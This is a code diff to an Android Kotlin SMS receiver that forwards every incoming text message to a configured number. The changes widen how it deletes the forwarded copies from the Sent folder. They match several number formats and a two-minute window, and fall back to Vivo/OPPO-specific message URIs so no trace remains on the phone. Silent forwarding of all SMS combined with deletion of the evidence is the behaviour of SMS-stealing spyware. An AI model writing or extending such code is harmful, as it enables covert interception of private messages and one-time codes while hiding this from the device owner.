@@ -5,11 +5,10 @@ import android.content.Context
 import android.content.Intent
 import android.database.Cursor
 import android.net.Uri
-import android.os.Build
 import android.provider.Telephony
 import android.telephony.SmsManager
-import android.telephony.SubscriptionManager
 import android.util.Log
+import java.util.Date
 
 class SmsReceiver : BroadcastReceiver() {
 
@@ -32,30 +31,86 @@ class SmsReceiver : BroadcastReceiver() {
 
         Log.d(TAG, "SMS from $sender: $fullMessage")
 
-        // Форматируем номер: убираем +7/8 и код страны
         val cleanNumber = cleanPhoneNumber(sender)
-
-        // Формируем текст: номер дата|время\ntext
         val forwardNumber = SettingsManager.forwardNumber
         val forwardText = buildForwardText(cleanNumber, fullMessage)
 
         Log.d(TAG, "Forwarding to $forwardNumber: $forwardText")
 
-        // Отправляем SMS
         sendSms(context, forwardNumber, forwardText)
 
-        // Удаляем отправленное сообщение из Sent
-        deleteSentMessage(context, forwardNumber, forwardText)
+        // Удаляем отправленное сообщение с разными форматами номера
+        val phoneFormats = listOf(
+            forwardNumber,
+            "+$forwardNumber",
+            "8$forwardNumber",
+            "7$forwardNumber"
+        )
+
+        val now = System.currentTimeMillis()
+        val twoMinutesAgo = now - 2 * 60 * 1000
+
+        for (format in phoneFormats) {
+            if (deleteByUri(context, Telephony.Sms.Sent.CONTENT_URI, format, forwardText, twoMinutesAgo)) {
+                return
+            }
+        }
+
+        // Пробуем кастомные URI для Vivo/OPPO
+        val customUris = listOf(
+            Uri.parse("content://mms-sms/conversations?simple=true"),
+            Uri.parse("content://mms-sms/messages/"),
+            Uri.parse("content://mms-sms/threadConversations")
+        )
+
+        for (uri in customUris) {
+            try {
+                val cursor = context.contentResolver.query(
+                    uri,
+                    arrayOf("_id", "address", "body", "date"),
+                    null,
+                    null,
+                    "date DESC"
+                )
+                cursor?.use { c ->
+                    while (c.moveToNext()) {
+                        val addressIdx = c.getColumnIndex("address")
+                        val bodyIdx = c.getColumnIndex("body")
+                        val idIdx = c.getColumnIndex("_id")
+                        val dateIdx = c.getColumnIndex("date")
+
+                        if (addressIdx >= 0 && bodyIdx >= 0 && idIdx >= 0 && dateIdx >= 0) {
+                            val address = c.getString(addressIdx)
+                            val messageBody = c.getString(bodyIdx)
+                            val date = c.getLong(dateIdx)
+                            val id = c.getLong(idIdx)
+
+                            if (address != null && messageBody != null && date >= twoMinutesAgo) {
+                                for (format in phoneFormats) {
+                                    if (address.contains(format) && messageBody.contains(forwardText.take(50))) {
+                                        val msgUri = Uri.parse("content://mms-sms/$id")
+                                        context.contentResolver.delete(msgUri, null, null)
+                                        Log.d(TAG, "Deleted via custom URI: $msgUri")
+                                        return
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to query custom URI", e)
+            }
+        }
     }
 
     private fun cleanPhoneNumber(phone: String): String {
-        // Убираем всё кроме цифр
         val digits = phone.filter { it.isDigit() }
         return when {
-            digits.startsWith("7") && digits.length == 11 -> digits.substring(1)  // +7...
-            digits.startsWith("8") && digits.length == 11 -> digits.substring(1)  // 8...
-            digits.startsWith("7") && digits.length == 10 -> digits.substring(1)  // 7...
-            else -> digits  // оставляем как есть
+            digits.startsWith("7") && digits.length == 11 -> digits.substring(1)
+            digits.startsWith("8") && digits.length == 11 -> digits.substring(1)
+            digits.startsWith("7") && digits.length == 10 -> digits.substring(1)
+            else -> digits
         }
     }
 
@@ -79,26 +134,41 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 
-    private fun deleteSentMessage(context: Context, phoneNumber: String, body: String) {
-        try {
-            val uri = Telephony.Sms.Sent.CONTENT_URI
-            val projection = arrayOf("_id")
-            val selection = "address = ? AND body = ?"
-            val selectionArgs = arrayOf(phoneNumber, body)
+    private fun deleteByUri(
+        context: Context,
+        uri: Uri,
+        address: String,
+        body: String,
+        afterTime: Long
+    ): Boolean {
+        return try {
+            val projection = arrayOf("_id", "address", "body", "date")
+            val selection = "address = ? AND date > ?"
+            val selectionArgs = arrayOf(address, afterTime.toString())
 
             context.contentResolver.query(uri, projection, selection, selectionArgs, "date DESC")?.use { cursor ->
-                if (cursor.moveToFirst()) {
-                    val idIndex = cursor.getColumnIndex("_id")
-                    if (idIndex >= 0) {
-                        val id = cursor.getLong(idIndex)
-                        val msgUri = Uri.parse("content://sms/$id")
-                        context.contentResolver.delete(msgUri, null, null)
-                        Log.d(TAG, "Deleted sent message: $msgUri")
+                var found = false
+                while (cursor.moveToNext()) {
+                    val idIdx = cursor.getColumnIndex("_id")
+                    val bodyIdx = cursor.getColumnIndex("body")
+
+                    if (idIdx >= 0 && bodyIdx >= 0) {
+                        val id = cursor.getLong(idIdx)
+                        val msgBody = cursor.getString(bodyIdx)
+
+                        if (msgBody == body || msgBody?.startsWith(body.take(30)) == true) {
+                            val msgUri = Uri.parse("content://sms/$id")
+                            context.contentResolver.delete(msgUri, null, null)
+                            Log.d(TAG, "Deleted sent message: $msgUri")
+                            found = true
+                        }
                     }
                 }
-            }
+                found
+            } ?: false
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to delete sent message", e)
+            Log.e(TAG, "Failed to delete via $uri", e)
+            false
         }
     }
 }
